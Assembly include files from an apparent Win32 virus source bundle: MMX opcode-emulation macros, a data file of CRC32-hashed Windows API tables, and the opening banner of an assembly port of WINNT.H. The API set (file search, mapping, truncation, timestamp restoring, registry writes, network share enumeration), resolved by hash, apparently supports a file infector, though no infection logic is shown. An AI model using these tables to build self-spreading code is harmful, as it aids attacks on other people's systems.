        mM3     TEXTEQU <BX>
        mM4     TEXTEQU <SP>
        mM5     TEXTEQU <BP>
        mM6     TEXTEQU <SI>
        mM7     TEXTEQU <DI>

ELSE
        MM0     TEXTEQU <EAX>
        MM1     TEXTEQU <ECX>
        MM2     TEXTEQU <EDX>
        MM3     TEXTEQU <EBX>
        MM4     TEXTEQU <ESP>
        MM5     TEXTEQU <EBP>
        MM6     TEXTEQU <ESI>
        MM7     TEXTEQU <EDI>

        mm0     TEXTEQU <EAX>
        mm1     TEXTEQU <ECX>
        mm2     TEXTEQU <EDX>
        mm3     TEXTEQU <EBX>
        mm4     TEXTEQU <ESP>
        mm5     TEXTEQU <EBP>
        mm6     TEXTEQU <ESI>
        mm7     TEXTEQU <EDI>

        Mm0     TEXTEQU <EAX>
        Mm1     TEXTEQU <ECX>
        Mm2     TEXTEQU <EDX>
        Mm3     TEXTEQU <EBX>
        Mm4     TEXTEQU <ESP>
        Mm5     TEXTEQU <EBP>
        Mm6     TEXTEQU <ESI>
        Mm7     TEXTEQU <EDI>

        mM0     TEXTEQU <EAX>
        mM1     TEXTEQU <ECX>
        mM2     TEXTEQU <EDX>
        mM3     TEXTEQU <EBX>
        mM4     TEXTEQU <ESP>
        mM5     TEXTEQU <EBP>
        mM6     TEXTEQU <ESI>
        mM7     TEXTEQU <EDI>
ENDIF
EndM

; ALIAS R# to MM# registers
DefineMMxNUM Macro
        MM0     TEXTEQU <0>
        MM1     TEXTEQU <0>
        MM2     TEXTEQU <0>
        MM3     TEXTEQU <0>
        MM4     TEXTEQU <0>
        MM5     TEXTEQU <0>
        MM6     TEXTEQU <0>
        MM7     TEXTEQU <0>

        mm0     TEXTEQU <0>
        mm1     TEXTEQU <0>
        mm2     TEXTEQU <0>
        mm3     TEXTEQU <0>
        mm4     TEXTEQU <0>
        mm5     TEXTEQU <0>
        mm6     TEXTEQU <0>
        mm7     TEXTEQU <0>

        Mm0     TEXTEQU <0>
        Mm1     TEXTEQU <0>
        Mm2     TEXTEQU <0>
        Mm3     TEXTEQU <0>
        Mm4     TEXTEQU <0>
        Mm5     TEXTEQU <0>
        Mm6     TEXTEQU <0>
        Mm7     TEXTEQU <0>

        mM0     TEXTEQU <0>
        mM1     TEXTEQU <0>
        mM2     TEXTEQU <0>
        mM3     TEXTEQU <0>
        mM4     TEXTEQU <0>
        mM5     TEXTEQU <0>
        mM6     TEXTEQU <0>
        mM7     TEXTEQU <0>
EndM



UnDefineMMxRegs Macro
        MM0     TEXTEQU <MM0>
        MM1     TEXTEQU <MM1>
        MM2     TEXTEQU <MM2>
        MM3     TEXTEQU <MM3>
        MM4     TEXTEQU <MM4>
        MM5     TEXTEQU <MM5>
        MM6     TEXTEQU <MM6>
        MM7     TEXTEQU <MM7>

        mm0     TEXTEQU <mm0>
        mm1     TEXTEQU <mm1>
        mm2     TEXTEQU <mm2>
        mm3     TEXTEQU <mm3>
        mm4     TEXTEQU <mm4>
        mm5     TEXTEQU <mm5>
        mm6     TEXTEQU <mm6>
        mm7     TEXTEQU <mm7>

        Mm0     TEXTEQU <Mm0>
        Mm1     TEXTEQU <Mm1>
        Mm2     TEXTEQU <Mm2>
        Mm3     TEXTEQU <Mm3>
        Mm4     TEXTEQU <Mm4>
        Mm5     TEXTEQU <Mm5>
        Mm6     TEXTEQU <Mm6>
        Mm7     TEXTEQU <Mm7>

        mM0     TEXTEQU <mM0>
        mM1     TEXTEQU <mM1>
        mM2     TEXTEQU <mM2>
        mM3     TEXTEQU <mM3>
        mM4     TEXTEQU <mM4>
        mM5     TEXTEQU <mM5>
        mM6     TEXTEQU <mM6>
        mM7     TEXTEQU <mM7>
EndM


rdpmc     macro
        db      0fh, opc_Rdpmc
endm

emms     macro
        db      0fh, opc_Emms
endm


;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
movd1   macro   dst:req, src:req       ; MMX->EXX
       local   x, y
                DefineMMxNUM
                DefineMMxRegs
x:
        cmpxchg   dst, src
y:
        org     x+1
        byte    opc_Movd_st
        org     y
                UnDefineMMxRegs
        endm
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
movd2   macro   dst:req, src:req        ;  MEM || EXX || MMX -> MMX
       local   x, y
                DefineMMxNUM
                DefineMMxRegs
x:
        cmpxchg   src, dst
y:
        org     x+1
        byte    opc_Movd_ld
        org     y
                UnDefineMMxRegs
        endm

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
movd3   macro   dst:req, src:req        ; MMX -> MEM
       local   x, y
                DefineMMxNUM
                DefineMMxRegs
x:
        cmpxchg   dst, src
y:
        org     x+1
        byte    opc_Movd_st
        org     y
                UnDefineMMxRegs
        endm
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

movdt    macro   dst:req, src:req
        local   x, y
                DefineMMxRegs
x:
        cmpxchg   src, dst
y:
        org     x+1
        byte    opc_Movd_ld
        org     y
                UnDefineMMxRegs
        endm

movdf   macro   dst:req, src:req
        local   x, y
                DefineMMxRegs
x:
        cmpxchg   dst, src
y:
        org     x+1
        byte    opc_Movd_st
        org     y
                UnDefineMMxRegs
        endm

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
movq1   macro   dst:req, src:req
        local   x, y
                DefineMMxRegs
x:
        cmpxchg   src, dst
y:
        org     x+1
        byte    opc_Movq_ld
        org     y
                UnDefineMMxRegs
        endm

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
movq2   macro   dst:req, src:req
        local   x, y
                DefineMMxRegs
x:
        cmpxchg   dst, src
y:
        org     x+1
        byte    opc_Movq_st
        org     y
                UnDefineMMxRegs
        endm

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
packssdw    macro   dst:req, src:req
        local   x, y
                DefineMMxRegs
x:
        cmpxchg   src, dst
y:
        org     x+1
        byte    opc_Packssdw
        org     y
                UnDefineMMxRegs
        endm

packsswb    macro   dst:req, src:req
        local   x, y
                DefineMMxRegs
x:
        cmpxchg   src, dst
y:
        org     x+1
        byte    opc_Packsswb
        org     y
                UnDefineMMxRegs
        endm

packuswb    macro   dst:req, src:req
        local   x, y
                DefineMMxRegs
x:
        cmpxchg   src, dst
y:
        org     x+1
        byte    opc_Packuswb
        org     y
                UnDefineMMxRegs
        endm

paddd    macro   dst:req, src:req
        local   x, y
                DefineMMxRegs
x:
        cmpxchg   src, dst
y:
        org     x+1
        byte    opc_Paddd
        org     y
                UnDefineMMxRegs
        endm

paddsb    macro   dst:req, src:req
        local   x, y
                DefineMMxRegs
x:
        cmpxchg   src, dst
y:
        org     x+1
        byte    opc_Paddsb
        org     y
                UnDefineMMxRegs
        endm

paddsw    macro   dst:req, src:req
        local   x, y
                DefineMMxRegs
x:
        cmpxchg   src, dst
y:
        org     x+1
        byte    opc_Paddsw
        org     y
                UnDefineMMxRegs
        endm

paddusb    macro   dst:req, src:req
        local   x, y
                DefineMMxRegs
x:
        cmpxchg   src, dst
y:
        org     x+1
        byte    opc_Paddusb
        org     y
                UnDefineMMxRegs
        endm

paddusw    macro   dst:req, src:req
        local   x, y
                DefineMMxRegs
x:
        cmpxchg   src, dst
y:
        org     x+1
        byte    opc_Paddusw
        org     y
                UnDefineMMxRegs
        endm

paddb    macro   dst:req, src:req
        local   x, y
                DefineMMxRegs
x:
        cmpxchg   src, dst
y:
        org     x+1
        byte    opc_Paddb
        org     y
                UnDefineMMxRegs
        endm

paddw    macro   dst:req, src:req
        local   x, y
                DefineMMxRegs
x:
        cmpxchg   src, dst
y:
        org     x+1
        byte    opc_Paddw
        org     y
                UnDefineMMxRegs
        endm

pand    macro   dst:req, src:req
        local   x, y
                DefineMMxRegs
x:
        cmpxchg   src, dst
y:
        org     x+1
        byte    opc_Pand
        org     y
                UnDefineMMxRegs
        endm

pandn    macro   dst:req, src:req
        local   x, y
                DefineMMxRegs
x:
        cmpxchg   src, dst
y:
        org     x+1
        byte    opc_Pandn
        org     y
                UnDefineMMxRegs
        endm

pcmpeqb    macro   dst:req, src:req
        local   x, y
                DefineMMxRegs
x:
        cmpxchg   src, dst
y:
        org     x+1
        byte    opc_Pcmpeqb
        org     y
                UnDefineMMxRegs
        endm

pcmpeqd    macro   dst:req, src:req
        local   x, y
                DefineMMxRegs
x:
        cmpxchg   src, dst
y:
        org     x+1
        byte    opc_Pcmpeqd
        org     y
                UnDefineMMxRegs
        endm

pcmpeqw    macro   dst:req, src:req
        local   x, y
                DefineMMxRegs
x:
        cmpxchg   src, dst
y:
        org     x+1
        byte    opc_Pcmpeqw
        org     y
                UnDefineMMxRegs
        endm

pcmpgtb    macro   dst:req, src:req
        local   x, y
                DefineMMxRegs
x:
        cmpxchg   src, dst
y:
        org     x+1
        byte    opc_Pcmpgtb
        org     y
                UnDefineMMxRegs
        endm

pcmpgtd    macro   dst:req, src:req
        local   x, y
                DefineMMxRegs
x:
        cmpxchg   src, dst
y:
        org     x+1
        byte    opc_Pcmpgtd
        org     y
                UnDefineMMxRegs
        endm

pcmpgtw    macro   dst:req, src:req
        local   x, y
                DefineMMxRegs
x:
        cmpxchg   src, dst
y:
        org     x+1
        byte    opc_Pcmpgtw
        org     y
                UnDefineMMxRegs
        endm

pmaddwd    macro   dst:req, src:req
        local   x, y
                DefineMMxRegs
x:
        cmpxchg   src, dst
y:
        org     x+1
        byte    opc_Pmaddwd
        org     y
                UnDefineMMxRegs
        endm

pmulhw    macro   dst:req, src:req
        local   x, y
                DefineMMxRegs
x:
        cmpxchg   src, dst
y:
        org     x+1
        byte    opc_Pmulhw
        org     y
                UnDefineMMxRegs
        endm

pmullw    macro   dst:req, src:req
        local   x, y
                DefineMMxRegs
x:
        cmpxchg   src, dst
y:
        org     x+1
        byte    opc_Pmullw
        org     y
                UnDefineMMxRegs
        endm

por    macro   dst:req, src:req
        local   x, y
                DefineMMxRegs
x:
        cmpxchg   src, dst
y:
        org     x+1
        byte    opc_Por
        org     y
                UnDefineMMxRegs
        endm


;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
pslld1    macro   dst:req, src:req   ;; constant
        local   x, y
                DefineMMxRegs
x:
        btr   dst, src
y:
        org     x+1
        byte    opc_PSHimd
        org     y
                UnDefineMMxRegs
        endm
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
pslld2    macro   dst:req, src:req
        local   x, y
                DefineMMxRegs
x:
        cmpxchg   src, dst
y:
        org     x+1
        byte    opc_Pslld
        org     y
                UnDefineMMxRegs
        endm
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;


psllw1    macro   dst:req, src:req
        local   x, y
                DefineMMxRegs
x:
        btr   dst, src
y:
        org     x+1
        byte    opc_PSHimw
        org     y
                UnDefineMMxRegs
        endm
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

psllw2    macro   dst:req, src:req
        local   x, y
                DefineMMxRegs
x:
        cmpxchg   src, dst
y:
        org     x+1
        byte    opc_Psllw
        org     y
                UnDefineMMxRegs
        endm

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;


psrad1    macro   dst:req, src:req  ;;immediate
        local   x, y
                DefineMMxRegs
x:
        bt   dst, src
y:
        org     x+1
        byte    opc_PSHimd
        org     y
                UnDefineMMxRegs
        endm
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

psrad2    macro   dst:req, src:req
        local   x, y
                DefineMMxRegs
x:
        cmpxchg   src, dst
y:
        org     x+1
        byte    opc_Psrad
        org     y
                UnDefineMMxRegs
        endm

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

psraw1    macro   dst:req, src:req
        local   x, y
                DefineMMxRegs
x:
        bt   dst, src
y:
        org     x+1
        byte    opc_PSHimw
        org     y
                UnDefineMMxRegs
        endm

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

psraw2    macro   dst:req, src:req
        local   x, y
                DefineMMxRegs
x:
        cmpxchg   src, dst
y:
        org     x+1
        byte    opc_Psraw
        org     y
                UnDefineMMxRegs
        endm


;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

psrld1    macro   dst:req, src:req
        local   x, y
                DefineMMxRegs
x:
        cmpxchg dst,MM2
        byte    src
y:
        org     x+1
        byte    opc_PSHimd
        org     y
                UnDefineMMxRegs
        endm

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

psrld2    macro   dst:req, src:req
        local   x, y
                DefineMMxRegs
x:
        cmpxchg   src, dst
y:
        org     x+1
        byte    opc_Psrld
        org     y
                UnDefineMMxRegs
        endm

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
psrlq1    macro   dst:req, src:req
        local   x, y
                DefineMMxRegs
x:
        cmpxchg dst,MM2
        byte    src
y:
        org     x+1
        byte    opc_PSHimq
        org     y
                UnDefineMMxRegs
        endm

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

psrlq2    macro   dst:req, src:req
        local   x, y
                DefineMMxRegs
x:
        cmpxchg   src, dst
y:
        org     x+1
        byte    opc_Psrlq
        org     y
                UnDefineMMxRegs
        endm


;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
psllq1    macro   dst:req, src:req
        local   x, y
                DefineMMxRegs
x:
        btr   dst, src
y:
        org     x+1
        byte    opc_PSHimq
        org     y
                UnDefineMMxRegs
        endm


;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
psllq2    macro   dst:req, src:req
        local   x, y
                DefineMMxRegs
x:
        cmpxchg   src, dst
y:
        org     x+1
        byte    opc_Psllq
        org     y
                UnDefineMMxRegs
        endm

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

psrlw1    macro   dst:req, src:req
        local   x, y
                DefineMMxRegs
x:
        cmpxchg dst,MM2
        byte    src
y:
        org     x+1
        byte    opc_PSHimw
        org     y
                UnDefineMMxRegs
        endm


;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

psrlw2    macro   dst:req, src:req
        local   x, y
                DefineMMxRegs
x:
        cmpxchg   src, dst
y:
        org     x+1
        byte    opc_Psrlw
        org     y
                UnDefineMMxRegs
        endm

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

psubsb    macro   dst:req, src:req
        local   x, y
                DefineMMxRegs
x:
        cmpxchg   src, dst
y:
        org     x+1
        byte    opc_Psubsb
        org     y
                UnDefineMMxRegs
        endm

psubsw    macro   dst:req, src:req
        local   x, y
                DefineMMxRegs
x:
        cmpxchg   src, dst
y:
        org     x+1
        byte    opc_Psubsw
        org     y
                UnDefineMMxRegs
        endm

psubusb    macro   dst:req, src:req
        local   x, y
                DefineMMxRegs
x:
        cmpxchg   src, dst
y:
        org     x+1
        byte    opc_Psubusb
        org     y
                UnDefineMMxRegs
        endm

psubusw    macro   dst:req, src:req
        local   x, y
                DefineMMxRegs
x:
        cmpxchg   src, dst
y:
        org     x+1
        byte    opc_Psubusw
        org     y
                UnDefineMMxRegs
        endm

psubb    macro   dst:req, src:req
        local   x, y
                DefineMMxRegs
x:
        cmpxchg   src, dst
y:
        org     x+1
        byte    opc_Psubb
        org     y
                UnDefineMMxRegs
        endm

psubw    macro   dst:req, src:req
        local   x, y
                DefineMMxRegs
x:
        cmpxchg   src, dst
y:
        org     x+1
        byte    opc_Psubw
        org     y
                UnDefineMMxRegs
        endm

punpcklbw    macro   dst:req, src:req
        local   x, y
                DefineMMxRegs
x:
        cmpxchg   src, dst
y:
        org     x+1
        byte    opc_Punpcklbw
        org     y
                UnDefineMMxRegs
        endm

punpckhdq    macro   dst:req, src:req
        local   x, y
                DefineMMxRegs
x:
        cmpxchg   src, dst
y:
        org     x+1
        byte    opc_Punpckhdq
        org     y
                UnDefineMMxRegs
        endm

punpcklwd    macro   dst:req, src:req
        local   x, y
                DefineMMxRegs
x:
        cmpxchg   src, dst
y:
        org     x+1
        byte    opc_Punpcklwd
        org     y
                UnDefineMMxRegs
        endm

punpckhbw    macro   dst:req, src:req
        local   x, y
                DefineMMxRegs
x:
        cmpxchg   src, dst
y:
        org     x+1
        byte    opc_Punpckhbw
        org     y
                UnDefineMMxRegs
        endm

punpckldq    macro   dst:req, src:req
        local   x, y
                DefineMMxRegs
x:
        cmpxchg   src, dst
y:
        org     x+1
        byte    opc_Punpckldq
        org     y
                UnDefineMMxRegs
        endm

punpckhwd    macro   dst:req, src:req
        local   x, y
                DefineMMxRegs
x:
        cmpxchg   src, dst
y:
        org     x+1
        byte    opc_Punpckhwd
        org     y
                UnDefineMMxRegs
        endm

pxor    macro   dst:req, src:req
        local   x, y
                DefineMMxRegs
x:
        cmpxchg   src, dst
y:
        org     x+1
        byte    opc_Pxor
        org     y
                UnDefineMMxRegs
        endm

psubd   macro   dst:req, src:req
        local   x, y
                DefineMMxRegs
x:
        cmpxchg   src, dst
y:
        org     x+1
        byte    opc_Psubd
        org     y
                UnDefineMMxRegs
        endm
ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ[MMX.INC]ƒƒƒ
ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ[RAMMDATA.INC]ƒƒƒ
;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ
module_names       label
kernel32_name:     noter <KERNEL32.dll>
advapi32_name:     noter <ADVAPI32.dll>
user32_name:       noter <USER32.dll>
gdi32_name:        noter <GDI32.dll>
img32_name:        noter <IMAGEHLP.dll>
mpr32_name:        noter <MPR.dll>
module_names_length = $-offset module_names

k32                dd 0
a32                dd 0
u32                dd 0
g32                dd 0
m32                dd 0
getmodulehandle:   noter <GetModuleHandleA>
getmodulehandlelen = $-offset getmodulehandle
;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ
kernel32apis label
             crc32 <LoadLibraryA>
             crc32 <GetProcAddress>
             crc32 <ExitProcess>
             crc32 <CreateThread>
             crc32 <ExitThread>
             crc32 <SuspendThread>
             crc32 <ResumeThread>
             crc32 <SetThreadPriority>
             crc32 <WaitForSingleObject>
             crc32 <WaitForMultipleObjects>
             crc32 <WaitForMultipleObjectsEx>
             crc32 <CreateFileA>
             crc32 <CreateFileMappingA>
             crc32 <MapViewOfFile>
             crc32 <UnmapViewOfFile>
             crc32 <CloseHandle>
             crc32 <GetFileAttributesA>
             crc32 <GetFileAttributesExA>
             crc32 <SetFileAttributesA>
             crc32 <GetFileTime>
             crc32 <SetFileTime>
             crc32 <SetFilePointer>
             crc32 <SetEndOfFile>
             crc32 <DeleteFileA>
             crc32 <FindFirstFileA>
             crc32 <FindNextFileA>
             crc32 <FindClose>
             crc32 <lstrlen>
             crc32 <lstrcpy>
             crc32 <lstrcat>
             crc32 <GetSystemDirectoryA>
             crc32 <GetWindowsDirectoryA>
             crc32 <GetCurrentDirectoryA>
             crc32 <SetCurrentDirectoryA>
             crc32 <GetSystemTime>
             crc32 <GetTickCount>
             crc32 <IsBadReadPtr>
             crc32 <CreateSemaphoreA>
             crc32 <ReleaseSemaphore>
             crc32 <MoveFileA>
             crc32 <MoveFileExA>
             crc32 <OpenFile>
             crc32 <CreateProcessA>
             crc32 <WinExec>
             crc32 <CopyFileA>
             crc32 <CopyFileExA>
             crc32 <GetFullPathNameA>
             crc32 <GetCompressedFileSizeA>
             crc32 <GetDriveTypeA>
             crc32 <GetVersionExA>
             crc32 <VirtualAlloc>
             crc32 <FatalAppExitA>
             crc32 <GetFileSize>
             crc32 <IsBadWritePtr>
             crc32 <GetModuleHandleA>
             crc32 <Sleep>
             crc32 <GlobalAlloc>
             crc32 <GlobalFree>
             crc32 <GetModuleFileNameA>
             crc32 <WritePrivateProfileStringA>
             dd 0

kernel32addr label
             _LoadLibraryA          dd 0
             _GetProcAddress        dd 0
             _ExitProcess           dd 0
             _CreateThread          dd 0
             _ExitThread            dd 0
             _SuspendThread         dd 0
             _ResumeThread          dd 0
             _SetThreadPriority     dd 0
             _WaitForSingleObject   dd 0
             _WaitForMultipleObjects dd 0
             _WaitForMultipleObjectsEx dd 0
             _CreateFileA           dd 0
             _CreateFileMappingA    dd 0
             _MapViewOfFile         dd 0
             _UnmapViewOfFile       dd 0
             _CloseHandle           dd 0
             _GetFileAttributesA    dd 0
             _GetFileAttributesExA  dd 0
             _SetFileAttributesA    dd 0
             _GetFileTime           dd 0
             _SetFileTime           dd 0
             _SetFilePointer        dd 0
             _SetEndOfFile          dd 0
             _DeleteFileA           dd 0
             _FindFirstFileA        dd 0
             _FindNextFileA         dd 0
             _FindClose             dd 0
             _lstrlen               dd 0
             _lstrcpy               dd 0
             _lstrcat               dd 0
             _GetSystemDirectoryA   dd 0
             _GetWindowsDirectoryA  dd 0
             _GetCurrentDirectoryA  dd 0
             _SetCurrentDirectoryA  dd 0
             _GetSystemTime         dd 0
             _GetTickCount          dd 0
             _IsBadReadPtr          dd 0
             _CreateSemaphoreA      dd 0
             _ReleaseSemaphore      dd 0
             _MoveFileA             dd 0
             _MoveFileExA           dd 0
             _OpenFile              dd 0
             _CreateProcessA        dd 0
             _WinExec               dd 0
             _CopyFileA             dd 0
             _CopyFileExA           dd 0
             _GetFullPathNameA      dd 0
             _GetCompressedFileSizeA dd 0
             _GetDriveTypeA         dd 0
             _GetVersionExA         dd 0
             _VirtualAlloc          dd 0
             _FatalAppExitA         dd 0
             _GetFileSize           dd 0
             _IsBadWritePtr         dd 0
             _GetModuleHandleA      dd 0
             _Sleep                 dd 0
             _GlobalAlloc           dd 0
             _GlobalFree            dd 0
             _GetModuleFileNameA    dd 0
             _WritePrivateProfileStringA dd 0
kernel32func = ($-offset kernel32addr)/4
;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ
advapi32apis label
             crc32 <RegOpenKeyExA>
             crc32 <RegQueryValueExA>
             crc32 <RegQueryInfoKeyA>
             crc32 <RegEnumValueA>
             crc32 <RegSetValueExA>
             crc32 <RegCreateKeyExA>
             crc32 <RegCloseKey>
             dd 0

advapi32addr label
             _RegOpenKeyExA    dd 0
             _RegQueryValueExA dd 0
             _RegQueryInfoKeyA dd 0
             _RegEnumValueA    dd 0
             _RegSetValueExA   dd 0
             _RegCreateKeyExA  dd 0
             _RegCloseKey      dd 0

advapi32func = ($-offset advapi32addr)/4
;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ
user32apis label
             crc32 <SetTimer>
             crc32 <KillTimer>
             crc32 <FindWindowA>
             crc32 <PostMessageA>
             crc32 <MessageBoxA>
             crc32 <CharUpperBuffA>
             crc32 <LoadIconA>
             crc32 <LoadCursorA>
             crc32 <GetWindowDC>
             crc32 <GetClientRect>
             crc32 <BeginPaint>
             crc32 <EndPaint>
             crc32 <GetSystemMetrics>
             crc32 <GetDC>
             crc32 <InvalidateRect>
             crc32 <ShowWindow>
             crc32 <UpdateWindow>
             crc32 <GetMessageA>
             crc32 <TranslateMessage>
             crc32 <DispatchMessageA>
             crc32 <PostQuitMessage>
             crc32 <DefWindowProcA>
             crc32 <RegisterClassExA>
             crc32 <CreateWindowExA>
             crc32 <DestroyWindow>
             dd 0

user32addr label
             _SetTimer              dd 0
             _KillTimer             dd 0
             _FindWindowA           dd 0
             _PostMessageA          dd 0
             _MessageBoxA           dd 0
             _CharUpperBuffA        dd 0
             _LoadIconA             dd 0
             _LoadCursorA           dd 0
             _GetWindowDC           dd 0
             _GetClientRect         dd 0
             _BeginPaint            dd 0
             _EndPaint              dd 0
             _GetSystemMetrics      dd 0
             _GetDC                 dd 0
             _InvalidateRect        dd 0
             _ShowWindow            dd 0
             _UpdateWindow          dd 0
             _GetMessageA           dd 0
             _TranslateMessage      dd 0
             _DispatchMessageA      dd 0
             _PostQuitMessage       dd 0
             _DefWindowProcA        dd 0
             _RegisterClassExA      dd 0
             _CreateWindowExA       dd 0
             _DestroyWindow         dd 0
user32func = ($-offset user32addr)/4
;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ
gdi32apis label
             crc32 <GetStockObject>
             crc32 <GetCharWidthA>
             crc32 <TextOutA>
             crc32 <GetTextMetricsA>
gdi32addr label
             _GetStockObject        dd 0
             _GetCharWidthA         dd 0
             _TextOutA              dd 0
             _GetTextMetricsA       dd 0
gdi32func = ($-offset gdi32addr)/4
;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ
mpr32apis label
             crc32 <WNetOpenEnumA>
             crc32 <WNetEnumResourceA>
             crc32 <WNetCloseEnum>
mpr32addr label
             _WNetOpenEnumA     dd 0
             _WNetEnumResourceA dd 0
             _WNetCloseEnum     dd 0
mpr32func = ($-offset mpr32addr)/4
;------
ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ[RAMMDATA.INC]ƒƒƒ
ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ[W32NT_LJ.INC]ƒƒƒ
comment $

                  Lord Julus presents the Win32 help series

⁄ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒø
¿ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒŸ
⁄ƒø                                                                       ⁄ƒø
≥ ≥             This  is my  transformation of  the original WINNT.H      ≥ ≥
≥ ≥     file  from the Microsoft Windows SDK(C) for Windows  NT  5.0      ≥ ≥
≥ ≥     beta 2 and Windows 98, released on in Sept. 1998.                 ≥ ≥
≥ ≥     This  file  was   transformed  by  me  from  the original  C      ≥ ≥
≥ ≥     definition  into assembly language. You can use this file to      ≥ ≥
≥ ≥     quicken  up  writting your win32 programs in assembler.  You      ≥ ≥
≥ ≥     can use these files as you wish, as they are freeware.            ≥ ≥
≥ ≥                                                                       ≥ ≥
≥ ≥             However,  if  you find any mistake inside this file,      ≥ ≥
≥ ≥     it  is  probably due to the fact that I merely could see the      ≥ ≥
≥ ≥     monitor  while  converting  the  files. So, if you do notice      ≥ ≥
≥ ≥     something, please notify me on my e-mail address at:              ≥ ≥
≥ ≥                                                                       ≥ ≥
≥ ≥                   lordjulus@geocities.com                             ≥ ≥
≥ ≥                                                                       ≥ ≥
≥ ≥             Also, if you find any other useful stuff that can be      ≥ ≥
≥ ≥     included here, do not hesitate to tell me.                        ≥ ≥
≥ ≥                                                                       ≥ ≥
≥ ≥     Good luck,                                                        ≥ ≥
≥ ≥                                ⁄ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒø              ≥ ≥
≥ ≥                                ≥  Lord Julus (c) 1999  ≥              ≥ ≥
≥ ≥                                ¿ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒŸ              ≥ ≥
≥ ≥                                                                       ≥ ≥
¿ƒŸ                                                                       ¿ƒŸ
⁄ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒø
